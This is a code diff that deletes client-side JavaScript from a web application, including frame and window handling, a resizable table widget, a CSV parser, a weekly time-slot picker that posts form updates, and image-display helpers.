-    var dotmenu1 = document.getElementById('dotmen0');
-    if (dotmenu1 != null && dotmenu1.innerHTML!='')
-    {
-        if (allainputeles=='')buildactmenu();  
-        if (allainputeles=='') dotmenu1.parentNode.removeChild(dotmenu1);
-    }
-    if (indexwindow == null && opener!=null&& onmydomain( opener) && opener!=window && typeof(opener.indexwindow)!='undefined' && opener.indexwindow!=null)
-        indexwindow = opener.indexwindow;
-    if (indexwindow == null && parent.opener!=null&& onmydomain(parent.opener) && parent.opener!=parent && typeof(parent.opener.indexwindow)!='undefined' && parent.opener.indexwindow!=null)
-        indexwindow = parent.opener.indexwindow;
-     
-    oldonclose0 = window.onunload;
-    //if (indexwindow != null) indexwindow.managewin(window, 0);
-    window.onunload = function()
-    {
-        if (oldonclose0 != null)
-            oldonclose0();
-        //indexwindow.managewin(window, 1);
-    }
-    var myfontname1 = GetCookie('telamanfontname');
-    if (myfontname1!=null)
-    {
-        myfontname = myfontname1;
-    }
-    else if (typeof(defaultfontfamily)!='undefined')
-    {
-        myfontname = defaultfontfamily;
-    }
-    unifonts(document.body); 
-    if (typeof(thisislogin) == 'undefined') mywindowref();
-    if (window == parent.frames[1])
-    {
-        document.body.style.marginLeft = '1px';
-        if (typeof(DBGCOLOR)!='undefined')
-        {
-            document.body.style.backgroundColor = DBGCOLOR; 
-        }
-    }
-    if ( parent.parent!=parent || window != parent && window==parent.frames[1] && parent.frames[0].document.getElementById('homeico')!=null)
-    {
-        var homeico = document.getElementById('homeico');
-        if (homeico!=null)
-            homeico.parentNode.removeChild(homeico);
-    }
-    else if (window != parent && parent.parent.parent==parent.parent && parent.parent!=parent && parent.parent.frames[0].document.getElementById('homeico')!=null)
-    {
-        var homeico = document.getElementById('homeico');
-        if (homeico!=null)
-            homeico.parentNode.removeChild(homeico);
-    }
-    else
-    {
-        var homeico = document.getElementById('homeico');
-        if (homeico!=null)
-            homeico.innerHTML = homestr();
-    }    
-}
-function round1(p)
-{
-    var fw = 2;
-    if (p != '')
-        p = " width=" + p;
-    return "<table  style=\"font-family:inherit\"  border=0 align=center cellpadding=0 cellspacing=0 " + p + ">"
-            + "<tr style=\"font-family:inherit\"><td width=2  ></td><td colspan=1  height=2></td>"
-            + "<td width=2  ></td></tr><tr><td width=2  ></td>"
-            + "<td align=left valign=top style=\"border-radius:2px;-webkit-border-radius:2px;-moz-border-radius:2px;font-family:inherit\">";
-}
-function round10(p) {
-    var fw = 4;
-    if (p != '')
-        p = " width=" + p;
-    return "<table     border=0 align=center cellpadding=0 cellspacing=0 " + p + ">"
-            + "<tr><td width=5  ></td><td colspan=1   height=5></td>"
-            + "<td width=5 ></td></tr><tr><td width=5></td>"
-            + "<td align=left valign=top style=\"border:2px #696969 outset;box-shadow:#aaaaaa 1px 1px;border-radius:5px;-webkit-border-radius:5px;-moz-border-radius:5px;font-family:inherit;\">";
-}
-
-ResizeRounded.mapfromc2r = new Array();
-ResizeRounded.activeone = null;
-ResizeRounded.start2drag = function(anc)
-{
-    var p = anc.parentNode.parentNode.parentNode;
-    if (p.tagName.toLowerCase() != 'table')
-        p = p.parentNode;
-    ResizeRounded.mapfromc2r[p.parentNode.id].resizingwinstart(anc);
-}
-
-function ResizeRounded(c, resizeelements)
-{
-    if (c.id == null || c.id == '')
-    {
-        var j = mapfromc2r.length;
-        while (document.getElementById('resizing' + j) != null)
-            j++;
-        c.id = 'resizing' + j;
-    }
-    this.resizingw = c;
-    ResizeRounded.mapfromc2r[c.id] = this;
-    this.resizeelements = resizeelements;
-    this.resizingxy = null;
-    if (c.getElementsByTagName('table') == null || c.getElementsByTagName('table')[0] == null)
-        return;
-    this.anchor = c.getElementsByTagName('table')[0].rows[2].cells[2].getElementsByTagName('div')[0];
-    this.anchor1 = c.getElementsByTagName('table')[0].rows[1].cells[2].getElementsByTagName('div')[0];
-    this.anchor2 = c.getElementsByTagName('table')[0].rows[2].cells[1].getElementsByTagName('div')[0];
-    this.anchor.style.width = '5px';
-    this.anchor.style.height = '5px';
-    this.anchor1.style.height = (this.anchor1.parentNode.offsetHeight - 2) + 'px';
-    this.anchor2.style.width = (this.anchor2.parentNode.offsetWidth - 2) + 'px';
-
-    if (typeof (Drag) != 'undefined')
-    {
-        Drag.init(this.anchor);
-        Drag.init(this.anchor1);
-        Drag.init(this.anchor2);
-    }
-
-    this.resizingwinstart = function(anchor)
-    {
-        var xy = findPositionnoScrolling(anchor);
-        document.body.appendChild(anchor);
-        anchor.style.position = 'absolute';
-        anchor.style.left = xy[0] + 'px';
-        if (xy[1] < 0) 
-        anchor.style.top = xy[1] + 'px';
-        this.resizingxy = findPositionnoScrolling(anchor);
-        ResizeRounded.activeone = this;
-    };
-
-    this.shrink = function()
-    {
-        this.anchor1.style.height = '1px';
-        this.anchor2.style.width = '1px';
-    };
-
-    this.resizingwinend = function(anchor, i, j)
-    {
-        if (anchor != this.anchor1)
-            this.anchor1.style.height = '1px';
-        if (anchor != this.anchor2)
-            this.anchor2.style.width = '1px';
-        var xy = findPositionnoScrolling(anchor);
-        var dx = xy[0] - this.resizingxy[0];
-        var dy = xy[1] - this.resizingxy[1];
-        if (i == 1)
-            dy = 0;
-        if (j == 1)
-            dx = 0;
-        if (this.resizeelements != null)
-        {
-            this.resizeelements(this.resizingw.getElementsByTagName('table')[0].rows[1].cells[1], dx, dy);
-        }
-
-        this.resizingw.getElementsByTagName('table')[0].rows[i].cells[j].appendChild(anchor);
-        anchor.style.position = 'static';
-        if (anchor != this.anchor1)
-        {
-            this.anchor1.style.height = (this.anchor1.parentNode.offsetHeight - 2) + 'px';
-        }
-        if (anchor != this.anchor2)
-        {
-            this.anchor2.style.width = (this.anchor2.parentNode.offsetWidth - 2) + 'px';
-        }
-    };
-    this.fitsize = function()
-    {
-        this.anchor1.style.height = '1px';
-        this.anchor2.style.width = '1px';
-        this.resizingw.getElementsByTagName('table')[0].rows[0].cells[1].width = 10;
-        this.resizingw.getElementsByTagName('table')[0].rows[1].cells[1].width = 10;
-        this.resizingw.getElementsByTagName('table')[0].rows[2].cells[1].width = 10;
-        this.resizingw.getElementsByTagName('table')[0].rows[1].height = 10;
-        this.anchor1.style.height = (this.anchor1.parentNode.offsetHeight - 2) + 'px';
-        this.anchor2.style.width = (this.anchor2.parentNode.offsetWidth - 2) + 'px';
-    };
-
-    this.anchor.onDragStart = function(x, y)
-    {
-        ResizeRounded.start2drag(this);
-    };
-    this.anchor1.onmouseover = function()
-    {
-        if (ResizeRounded.activeone != null)
-            ResizeRounded.activeone.fitsize();
-    }
-    this.anchor2.onmouseover = function()
-    {
-        if (ResizeRounded.activeone != null)
-            ResizeRounded.activeone.fitsize();
-    }
-    this.anchor.onDragEnd = function(x, y)
-    {
-        if (ResizeRounded.activeone != null)
-            ResizeRounded.activeone.resizingwinend(this, 2, 2);
-        ResizeRounded.activeone = null;
-    };
-
-    this.anchor1.onDragStart = function(x, y)
-    {
-        ResizeRounded.start2drag(this);
-    };
-
-    this.anchor1.onDragEnd = function(x, y)
-    {
-        if (ResizeRounded.activeone != null)
-            ResizeRounded.activeone.resizingwinend(this, 1, 2);
-        ResizeRounded.activeone = null;
-    };
-
-    this.anchor2.onDragStart = function(x, y)
-    {
-        ResizeRounded.start2drag(this);
-    };
-
-    this.anchor2.onDragEnd = function(x, y)
-    {
-        if (ResizeRounded.activeone != null)
-            ResizeRounded.activeone.resizingwinend(this, 2, 1);
-        ResizeRounded.activeone = null;
-    };
-
-
-}
-
-
-function CSVParse()
-{
-    this.str = '';
-    this.quote = "\"";
-    this.separates = [',', '\r\n'];
-    this.previousOffset = -1;
-    this.PREQUOTE = 0;
-    this.QUOTE = 1;
-    this.UNQUOTE = 2;
-    this.POSTQUOTE = 3;
-    this.NAKED = 4;
-    this.FILEEND = 5;
-    this.ERROR = 6;
-    this.DIMENSIONEND = [7, 8];
-    this.states =
-            [
-                /*PREQUOTE  = 0*/  [0, 1, 4, 5, 7],
-                /*QUOTE     = 1*/  [1, 2, 1, 6, 1],
-                /*UNQUOTE   = 2*/  [3, 1, 6, 5, 7],
-                /*POSTQUOTE = 3*/  [3, 6, 6, 5, 7],
-                /*NAKED     = 4*/  [4, 4, 4, 5, 7],
-                /*FILE END  = 5*/  [5, 5, 5, 5, 5],
-                /*ERROR     = 6*/  [6, 6, 6, 6, 6],
-                /*DIM1 END  = 7*/  [0, 1, 4, 5, 7]
-
-            ];
-    this.state = this.PREQUOTE;
-    this.pstate;
-    this.ppOffset = -1;
-    this.ppstate = 0;
-    this.index = [0, 0];
-    this.numSeparates = 2;
-
-    if (arguments.length > 0)
-    {
-        this.str = arguments[0];
-    }
-    if (arguments.length >= 2)
-    {
-        this.quote = arguments[1];
-    }
-    if (arguments.length >= 3)
-    {
-        if (arguments[2] != null)
-        {
-            this.numSeparates = arguments.length - 2;
-            this.separates = new Array(this.numSeparates);
-            for (var i = 0; i < arguments.length - 2; i++)
-                this.separates[i] = arguments[i + 2];
-            this.index = new Array(this.numSeparates);
-            for (var j = 0; j < this.numSeparates; j++)
-                this.index[j] = 0;
-        }
-        else
-        {
-            this.numSeparates = 0;
-            this.separates = null;
-            this.numSeparates = 0;
-        }
-    }
-    if (this.numSeparates > 0)
-    {
-        this.DIMENSIONEND = new Array(this.numSeparates);
-        for (var i = 0; i < this.numSeparates; i++)
-            this.DIMENSIONEND[i] = (7 + i);
-    }
-
-    this.transit = function(charCode)
-    {
-        if (this.state == this.FILEEND || this.state == this.ERROR || this.state == this.QUOTE && charCode >= 4)
-        {
-            return;
-        }
-
-        var diff = 0;
-        if (charCode >= 4)
-        {
-            diff = charCode - 4;
-            charCode = 4;
-        }
-        var v = this.state;
-        if (v >= this.DIMENSIONEND[0])
-            v = 0;
-        this.state = this.states[v][charCode] + diff;
-
-    };
-
-    this.checkError = function(b)
-    {
-        if (b)
-        {
-            this.states[1][3] = this.states[2][2] = this.states[3][1] = this.states[3][2] = this.ERROR;
-        }
-        else
-        {
-            this.states[1][3] = FILEEND;
-            this.states[2][2] = this.states[3][1] = this.states[3][2] = this.POSTQUOTE;
-        }
-    };
-    
-    this.ignorespace = true;
-    
-    this.code = function(c)
-    {
-        if (  c == ' ')
-        {
-            return 0;
-        }
-        if (c == this.quote)
-        {
-            return 1;
-        }
-        for (var i = 0; i < this.numSeparates; i++)
-        {
-            if (this.separates[i].indexOf("" + c) >= 0)
-            {
-                return  (i + 4);
-            }
-        }
-
-        return 2;
-
-    };
-
-    this.putBack = function()
-    {
-        this.previousOffset = this.ppOffset;
-        this.state = this.ppstate;
-    }
-    this.nextElement = function()
-    {
-        this.ppOffset = this.previousOffset;
-        this.ppstate = this.state;
-        if (this.str==null || this.state == this.FILEEND || this.state == this.ERROR)
-        {
-            return null;
-        }
-        var k;
-        var c = ' ';
-        var i = this.previousOffset;
-        var charCode;
-        var i1,j1;
-        var j = i + 1;
-        var ans = '';
-        while (true)
-        {
-            i++;
-            if (i < this.str.length)
-            {
-                c = this.str.charAt(i);
-                charCode = this.code(c);
-            }
-            else
-            {
-                charCode = 3;
-            }
-
-            /*
-             if ( (this.state == this.PREQUOTE || this.state > (this.ERROR + 1) ) && charCode > 4)
-             {
-             continue;
-             }*/
-            this.pstate = this.state;
-            this.transit(charCode);
-
-            switch (this.state)
-            {
-                case this.PREQUOTE:
-                case this.NAKED:
-                    break;
-                case this.QUOTE:
-                    if (this.pstate == this.UNQUOTE)
-                    {
-                        j = i;
-                    }
-                    else if (this.pstate != this.QUOTE)
-                    {
-                        j = i + 1;
-                    }
-                    break;
-                case this.UNQUOTE:
-                    if (i > j)
-                    {
-                         
-                        ans += this.str.substring(j, i);
-                    }
-                    break;
-                case this.POSTQUOTE:
-                    break;
-                case this.ERROR:
-                    return null;
-                default:
-                    this.previousOffset = i;
-                    k = this.state - 7;
-                    if (k < 0)
-                    {
-                        k = this.numSeparates - 1;
-                    }
-                    for (var l = 0; l < k; l++)
-                        this.index[l] = 0;
-                    if (k >= 0)
-                        this.index[k]++;
-
-                    if (this.pstate == this.UNQUOTE || this.pstate == this.POSTQUOTE)
-                    {
-                        if (this.ignorespace == false && this.str.charAt(this.ppOffset+1)==' ')
-                        {
-                           ans = ' ' + ans;
-                        }
-                        return ans;
-                    }
-                    else
-                    {
-                        if (i > j)
-                        {
-                            if (this.ignorespace == false && j>0 && this.str.charAt(j-1)==' ')
-                            {
-                                j--;
-                            }
-                            return this.str.substring(j, i);
-                        }
-                        else
-                            return '';
-                    }
-            }
-        }
-    };
-
-    this.getState = function()
-    {
-        return this.state;
-    };
-    this.getPstate = function()
-    {
-        return this.pstate;
-    };
-    this.setString = function(s)
-    {
-        this.str = s;
-    };
-    this.setSeparates = function(s, i)
-    {
-        if (i == null)
-        {
-            if (s != null)
-            {
-                this.separates = s;
-                this.numSeparates = s.length;
-                this.index = new Array(this.numSeparates);
-                for (var j = 0; j < this.numSeparates; j++)
-                    this.index[j] = 0;
-            }
-            else
-            {
-                this.separates = null;
-                this.numSeparates = 0;
-                this.index = null;
-            }
-        }
-        else if (i < this.numSeparates)
-            this.separates[i] = s;
-        this.state = this.PREQUOTE;
-        this.previousOffset = -1;
-    };
-    this.setQuote = function(q)
-    {
-        this.quote = q;
-        this.state = this.PREQUOTE;
-        this.previousOffset = -1;
-    };
-
-    this.nextInt = function()
-    {
-        if (this.state == this.FILEEND)
-            return null;
-        var x = parseInt(this.nextElement());
-        if ('' + x == 'NaN')
-            return null;
-        return x;
-    };
-    this.nextFloat = function()
-    {
-        return parseFloat(this.nextElement());
-    };
-
-    this.beyong = function(x)
-    {
-        if (x == null || this.index == null || x.length != this.index.length)
-        {
-            return false;
-        }
-        for (var k = x.length - 1; k >= 0; k--)
-            if (this.index[k] < x[k])
-                return true;
-        return false;
-    };
-    this.elementAt = function(x)
-    {
-        while (this.beyong(x))
-        {
-            this.nextElement();
-        }
-        return this.nextElement();
-    };
-    this.hasSeparate = function(v)
-    {
-        for (var i = 0; i < this.numSeparates; i++)
-        {
-            for (var j = 0; j < this.separates[i].length; j++)
-                if (v.indexOf(this.separates[i].charAt(j)) >= 0)
-                    return true;
-        }
-        return false;
-    };
-    this.compose = function(v)
-    {
-        if (v == null)
-            return v;
-        if (this.hasSeparate(v))
-            return this.quote + this.doubleQuote(v) + this.quote;
-        return v;
-    };
-
-    this.doubleQuote = function(v)
-    {
-        var j = v.indexOf(this.quote);
-        if (j == -1)
-            return v;
-        if (j == v.length - 1)
-            return v + this.quote;
-        return v.substring(0, j + 1) + this.quote + this.doubleQuote(v.substring(j + 1));
-
-    };
-    this.setStr = function(x, v, ifadd)
-    {
-        if (x == null || this.index == null || x.length != this.index.length || this.str == null)
-        {
-            return;
-        }
-        this.reset();
-        while (this.beyong(x))
-        {
-            this.nextElement();
-        }
-
-        v = this.compose(v);
-        if (ifadd == false)
-        {
-            var ll = this.previousOffset + 1;
-            this.str = this.str.substring(0, ll) + v + this.str.substring(this.previousOffset);
-        }
-        else if (this.previousOffset > -1)
-        {
-            this.str = this.str.substring(0, this.previousOffset + 1) + v + this.separates[0].charAt(0) + this.str.substring(this.previousOffset + 1);
-        }
-        else
-        {
-            this.str = v + this.separates[0].charAt(0) + this.str;
-        }
-    };
-
-    this.nextRow = function()
-    {
-
-        if (this.state == this.FILEEND || this.state == this.ERROR || this.str == null)
-            return null;
-        var v = new Array();
-        do
-        {
-            v[v.length] = this.nextElement();
-        }
-        while (this.state == this.DIMENSIONEND[0]);
-
-        return v;
-    }
-    this.nextMatrix = function(ignoreblank)
-    {
-
-        if (this.state == this.FILEEND || this.state == this.ERROR || this.str == null)
-            return null;
-        var v = new Array();
-        do
-        {
-            var y = this.nextRow();
-            if (y.length > 1 || y[0] != null && y[0] != '' || ignoreblank == null || ignoreblank == false)
-                v[v.length] = y;
-
-        }
-        while (this.state == this.DIMENSIONEND[1]);
-        return v;
-    }
-    this.tohtml = function()
-    {
-        var x = this.nextMatrix();
-        var num = [];
-        for (var j=0; j < x[0].length+10; j++)
-        {
-            num[j] = true;
-            if (x.length < 2) num[j] = false;
-            for (var i=1; i < x.length; i++)
-            {
-                if (j >= x[i].length) continue;
-                if (x[i][j]!=null && x[i][j]!='' && isNaN(x[i][j]))
-                {
-                    num[j] = false; break;
-                }
-            }
-        }
-        var s = '<table border=1 style="border-collapse:collapse" >';
-        for (var i = 0; i < x.length; i++)
-        {
-            s += "<tr>";
-            for (var j = 0; j < x[i].length; j++)
-            {
-                var sp=1; for (var k=j+sp; k < x[i].length && x[i][k] == null; k++,sp++);
-                s += "<td " + (num[j]?"align=right ":"align=left ") + ((sp==1)?"":"colspan=" + sp) + ">" + x[i][j] + '</td>';
-            }
-            s += "</tr>";
-        }
-        return s + "</table>";
-    }
-}
-
-function getJsParam(js, params)
-{
-    var scripts = document.getElementsByTagName("script");
-    var sn, dn = null, args = null;
-    for (var i = 0, len = scripts.length; i < len; i++)
-    {
-        var src = scripts[i].getAttribute("src");
-        if (!src)
-            continue;
-        var x = src.split(/\?/);
-        var url = x[0];
-        args = x[1];
-        if (args && url.indexOf(js) >= 0)
-            break;
-    }
-    if (!args)
-        return null;
-    var argv = args.split(/&/);
-    var ans = [];
-    for (var i = 0; i < params.length; i++)
-    {
-        var argValue = null;
-        for (var j = 0, argc = argv.length; j < argc; j++)
-        {
-            var pair = argv[j].split("=");
-            if (pair[0] == params[i])
-            {
-                argValue = pair[1];
-                break;
-            }
-        }
-        ans[ans.length] = argValue;
-    }
-
-    return ans;
-}
-
-function dochangepic()
-{
-    window.open(saveredourl, 'w' + tstmp);
-}
-
-function delnotusedattach(x)
-{
-    if (x != null && x != '')
-    {
-        savedredourl = "UploadChangePic?dellist=" + encodeURIComponent(x);
-        postopen(savedredourl, 'w' + tstmp);
-        myprompt(textmsg[1306], null, null, textmsg[1635]);
-    }
-}
-
- 
-    
-
- 
- 
-function gohome1()
-{
-    var b = (indexwindow!=null);
-   
-    if (b)
-    { 
-        myprompt(indexwindow.document.title);
-        window.blur();
-       // opener.focus();
-       // indexrealClose();
-         
-    } 
-    else
-    {
-       var x = document.location.toString().replace(/[^\/]+$/,'');
-       indexwindow = open(x,'_blank');
-    }
-}
-
-//notifyopenertodie();
-
-function weekdaynamestr(s)
-{
-    var y = '';
-    var x = textmsg[830].split( "" );
-    var z = "NMTWRFS".split( "" );
-    for (var i = 0; i < x.length; i++)
-    {
-        y += "<option value=\"" + x[i] + "\"";
-        if (s == x[i] || s == z[i])
-            y += " selected ";
-        y += ">" + x[i] + "</option>";
-    }
-    if (s == null)
-        return "<option value=\"\"></option>" + y;
-    return  y;
-}
-function readweekhourmin(k, i)
-{
-    var x = document.getElementById('weekhourminsel' + k + i);
-    return x.options[x.selectedIndex].value;
-}
-function hourminnumstr(m, n)
-{
-    var y = '';
-    for (var i = 0; i < m; i++)
-    {
-        var xx = '' + i;
-        if (i < 10)
-            xx = '0' + i;
-        y += "<option value=\"" + xx + "\"";
-        if (xx == n || xx == '0' + n)
-            y += " selected ";
-        y += ">" + xx + "</option>";
-    }
-    if (n == null)
-        return "<option value=\"\" selected ></option>" + y;
-    return y;
-}
-function showtimeslots(sel, cl, firsttime)
-{
-    var cr = 0;
-    if (datapresentformat == 'DataTable')
-    {
-        cr = rr;
-        var v = sel.value;
-    }
-    else
-    {
-        var l = sel.selectedIndex;
-        var v = '';
-        if (l > -1)
-            v = sel.options[l].text;
-    }
-    var s = v.split(/,/);
-    var k = 0;
-    var heading = textmsg[1360].split(/@/);
-    var x = '<table style="-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;border-color:#d0d0c0;border-collapse:collapse;background-color:white" border=1 cellspacing=1 cellpadding=2 ><tr bgcolor=#eee ><td>' + heading[0] + "</td><td colspan=3>" + heading[1] + "</td><td></td><td colspan=3>" + heading[2] + "</td></tr>";
-    for (var i = 0; i < s.length && v != ''; i++)
-    {
-        var wd = s[i].replace(/([0-9])/, '@$1').split(/@/);
-        if (wd.length < 2)
-            continue;
-
-        var y = wd[0].split( "" );
-        var z = wd[1].replace(/^\s+/, '').replace(/\s+$/, '').split(/[^0-9]+/);
-
-        for (var j = 0; j < y.length; j++)
-        {
-
-            if (textmsg[830].indexOf(y[j]) == -1 && "NMTWRFS".indexOf(y[i]) == -1 || z.length != 4)
-                continue;
-            x += "<tr><td><select id=weekhourminsel" + k + "0 >" + weekdaynamestr(y[j]) + "</select></td><td><select id=weekhourminsel" + k + "1>"
-                    + hourminnumstr(24, z[0]) + "</select></td><td>:</td><td><select id=weekhourminsel" + k + "2>"
-                    + hourminnumstr(60, z[1]) + "</select></td><td> - </td><td><select id=weekhourminsel" + k + "3>"
-                    + hourminnumstr(24, z[2]) + "</select></td><td>:</td><td><select id=weekhourminsel" + k + "4>"
-                    + hourminnumstr(60, z[3]) + "</select></td></tr>";
-            k++;
-        }
-    }
-    for (; k < 5; k++)
-    {
-        x += "<tr><td><select id=weekhourminsel" + k + "0>" + weekdaynamestr() + "</select></td><td><select id=weekhourminsel" + k + "1>"
-                + hourminnumstr(24) + "</select></td><td>:</td><td><select id=weekhourminsel" + k + "2>"
-                + hourminnumstr(60) + "</select></td><td> - </td><td><select id=weekhourminsel" + k + "3>"
-                + hourminnumstr(24) + "</select></td><td>:</td><td><select id=weekhourminsel" + k + "4>"
-                + hourminnumstr(60) + "</select></td></tr>";
-    }
-    x += "<tr><td colspan=8 align=center><input class=OrangeButton style=text-align:center;width:" + Math.round(4.5 * font_size) + "px onclick=\"setbacktimeslots(" + cl + ")\" value=\"" + textmsg[829] + "\" ><input class=GreenButton style=text-align:center;width:" + Math.round(4.5 * font_size) + "px onclick=canceltimeslots(" + cl + ")  value=\"" + textmsg[18] + "\" ></td></tr></table>";
-
-
-    if (firsttime == 1)
-    {
-        sel.onchange = function()
-        {
-            if (datapresentformat == 'DataTable')
-            {
-                var nm = this.name.split(/_/);
-                UT(parseInt(nm[0]), parseInt(nm[1]));
-                showtimeslots(this, parseInt(nm[1]));
-            }
-            else
-            {
-                var nm = this.name;
-
-                var cll = 0;
-                for (; cll < numCols && fields[cll] != nm; cll++)
-                    ;
-
-                UT(counter, cll);
-                showtimeslots(this, cll);
-            }
-        }
-    }
-    else
-    {
-        myprompt(x, null, null, labels[cl]);
-        var xy = findPositionnoScrolling(sel);
-        promptwin.style.left = xy[0] + 'px';
-        if (xy[1] + 50 < 0) xy[1] = -50;
-        promptwin.style.top = (xy[1] + 50) + 'px';
-        promptwin.style.width = '200px';
-
-    }
-}
-
-
-
-function canceltimeslots(cl)
-{
-    setv(counter, cl, mat[counter][cl]);
-    closeprompt();
-}
-
-function newformele(nm,vl,dis)
-{
-    var z = formselementbyname(fsnd, nm);
-    if ( z == null)
-    {
-        var el = document.createElement('input');
-        el.type = 'hidden';
-        el.name = nm;
-        el.value = vl;
-        fsnd.appendChild(el);
-    }
-    else
-    {
-       z.value = y;
-       if (dis!=null) z.disabled = dis;
-    }
-
-}
-
-function setbacktimeslots(cl)
-{
-    var did = [];
-    for (var k = 0; k < 5; k++)
-    {
-        did[k] = false;
-    }
-    var y = '';
-    var mins = 0;
-    var min = 0;
-    for (var k = 0; k < 5; k++)
-    {
-        if (did[k])
-            continue;
-        var q = [readweekhourmin(k, 0), readweekhourmin(k, 1), readweekhourmin(k, 2), readweekhourmin(k, 3), readweekhourmin(k, 4)];
-        if (q[0] == '' || q[1] == '' || q[2] == '' || q[3] == '' || q[4] == '')
-            continue;
-        var z = q[0];
-        min = (parseInt(q[3]) * 60 + parseInt(q[4]) - parseInt(q[1]) * 60 + parseInt(q[2]));
-        mins += min;
-        for (var j = k + 1; j < 5; j++)
-        {
-            if (readweekhourmin(j, 1) == q[1]
-                    && readweekhourmin(j, 2) == q[2]
-                    && readweekhourmin(j, 3) == q[3]
-                    && readweekhourmin(j, 4) == q[4])
-            {
-                z += readweekhourmin(j, 0);
-                did[j] = true;
-                mins += min;
-            }
-        }
-        if (y != '')
-            y += ",";
-        y += z + q[1] + ":" + q[2] + "-" + q[3] + ":" + q[4];
-
-    }
-    var X = textmsg[830].split( "" );
-    var Y = y.replace(X[0], "N").replace(X[1], "M").replace(X[2], "T").replace(X[3], "W").replace(X[4], "R").replace(X[5], "F").replace(X[6], "S");
-    if (datapresentformat == 'DataForm')
-    {
-        var sel = ele(counter, cl);
-        var j = 0;
-        for (; j < sel.options.length; j++)
-        {
-            if (sel.options[j].value == y || sel.options[j].value == Y)
-            {
-                sel.selectedIndex = j;
-                break;
-            }
-        }
-        closeprompt();
-        if (j == sel.options.length)
-        {
-            var xx = '' + j;
-            if (j < 10)
-                xx = '0' + j;
-            sel.options[j] = new Option(y, xx);
-
-            sel.selectedIndex = j;
-            newformele('newtimeslots',y);
-            newformele('rdap','timeslotadd');
-            newformele('subdb',subdb);
-
-            mins = Math.ceil(mins / 60);
-            newformele('hours','' + mins);
-
-            formnewaction(fsnd, 'DataUpdate');
-            // formnewaction(fsnd, 'Echo');
-            fsnd.target = 'w' + tstmp;
-            //fsnd.target = '_blank'
-           visual(fsnd);
- fsnd.submit();
-            if (subdb != '')
-            {
-                formselementbyname(fsnd, 'subdb').value = '';
-                setTimeout(fsnd.submit, 1500);
-            }
-
-        }
-    }
-    else
-    {
-
-        var j = 0;
-        for (; j < NUMROWS; j++)
-        {
-            if (retrv(j, cl) == y || retrv(j, cl) == Y)
-            {
-                break;
-            }
-        }
-        if (j < NUMROWS)
-        {
-            myprompt(y + "" + textmsg[3]);
-        }
-        else
-        {
-            setv(rr, cl, y);
-            closeprompt();
-        }
-    }
-}
-
-function insertpicundera(m)
-{
-    var td = activealink.parentNode;
-    while (td.tagName.toLowerCase() != 'tr')
-        td = td.parentNode;
-    var nc = 0;
-    for (var jj = 0; jj < td.cells.length; jj++)
-    {
-        var zz = td.cells[jj].colSpan;
-        if (isNaN(zz + ''))
-            nc++;
-        else
-            nc += parseInt(zz);
-    }
-
-    var tbl = td.parentNode;
-    if (tbl.tagName.toLowerCase() != 'table')
-        tbl = tbl.parentNode;
-    var st = tbl.rows[tbl.rows.length - 1].cells[0].style;
-    var css = "";
-    for (var x in st)
-    {
-        if (st[x] != '' && isNaN(x))
-        {
-            css += x.replace(/([a-z])([A-Z])/, '$1-$2').toLowerCase() + ":" + st[x] + ";";
-        }
-    }
-    //var ww = tbl.rows[tbl.rows.length - 1].bgColor;
-    //var w1 = tbl.rows[tbl.rows.length - 1].cells[0].bgColor;
-    var r = tbl.insertRow(-1);
-    if (typeof(TBGCOLOR)!='undefined')
-        r.bgColor = TBGCOLOR;
-    else
-        r.bgColor = 'transparent';
-    var c = r.insertCell(0);
-    var yy = tbl.rows[tbl.rows.length - 1].cells[0].className;
-    if (yy != null && yy != '')
-        c.className = yy;
-    c.style.cssText = css.replace(/^csstext/i, '');
-    c.colSpan = nc;
-
-    //if (c.style.backgroundColor == null)
-    {
-        if (typeof(TBGCOLOR)!='undefined')
-            c.style.backgroundColor = TBGCOLOR;
-        else
-        {
-            c.style.backgroundColor ='transparent';
-        }
-    }
-    var wd = c.offsetWidth;
-    var wd1 = r.offsetWidth;
-    if (wd < wd1)
-        wd = wd1;
-    var mg = m.parentNode.parentNode.nextSibling.cells[0].childNodes[0];
-    if (mg.offsetWidth > wd)
-        mg.width = wd - 4;
-    c.appendChild(mg);
-    closeprompt();
-}
-function loadpicresize(m)
-{
-    if (m.offsetWidth < promptwin.offsetWidth - 10)
-        promptwin.style.width = (m.offsetWidth + 10) + 'px';
-
-    if (m.offsetWidth < promptwin.offsetWidth - 14)
-        m.style.width = (promptwin.offsetWidth - 10) + 'px';
-    if (typeof( ResizeUploaded.goodposition) != 'undefined')
-    ResizeUploaded.goodposition(m);
-}
-var Imagelet =
-{
-    fns2order : new Array(),
-    fns2dim : new Array(),
-    fn2s : new Array(),
-    addImagelet: function(r, i)
-    {
-        var xs = r.split(/@/);
-        Imagelet.fns2order[  xs[0] + "@" +  xs[1] ] = i;
-        Imagelet.fns2dim[    xs[0] + "@" +  xs[1] ] = xs[2];
-        var f=Imagelet.fn2s[ xs[1] ];
-        if (f==null)
-            Imagelet.fn2s[ xs[1] ]=  xs[0] + '_';
-        else   if (('_'+f).indexOf('_'+xs[0]+'_')<0)
-            Imagelet.fn2s[  xs[1]  ] +=  xs[0] + '_' ;
-    },
-    filldiv : function(code,fn)
-    {
-        var ns = Imagelet.fn2s[fn];
-        if (ns == null) return;
-        var ss = ns.replace(/_$/,'').split(/_/);
-        for (var j=0; j < ss.length; j++)
-        {
-           var y =  ss[j] + '@' + fn;
-           if (Imagelet.fns2order[y] == null || isNaN(Imagelet.fns2order[y])) continue;
-           var ns = Imagelet.fns2dim[y].split(/_/);
-           var ii = Imagelet.fns2order[y];
-
-           for (var k=0; ; k++)
-           {
-               var d = document.getElementById(ii + '_' + ss[j] + '_' + k);
-               if (d == null) break;
-               d.style.backgroundImage = 'url(FileOperation?did=' + code + ')';
-               d.style.backgroundPosition = '-'+ ns[0] + 'px -' + ns[1] + 'px';
-               d.style.width = ns[2] + 'px';
-               d.style.height = ns[3] + 'px';
-           }
-        }
-    }
-}
-function openpicorfile(did, filename, alink)
-{
-    activealink = alink;
-    var fn = filename.toLowerCase();
-    if (typeof(ResizeUploaded)!='undefined' && (fn.indexOf('.gif') >= 0 || fn.indexOf('.jpg') >= 0 || fn.indexOf('.jpeg') >= 0 || fn.indexOf('.png') >= 0))
-    {
-        did = ResizeUploaded.goodopenurl(did,false);
-        myprompt('<img src="' + did + '" style="margin:0px 0px 0px 0px" onload=loadpicresize(this)>', null, null, filename);
-        var tbl = promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0];
-        var td = tbl.rows[0].insertCell(1);
-        tbl.rows[1].cells[0].style.padding = "0px 0px 0px 0px";
-        tbl.rows[1].cells[0].colSpan = "3";
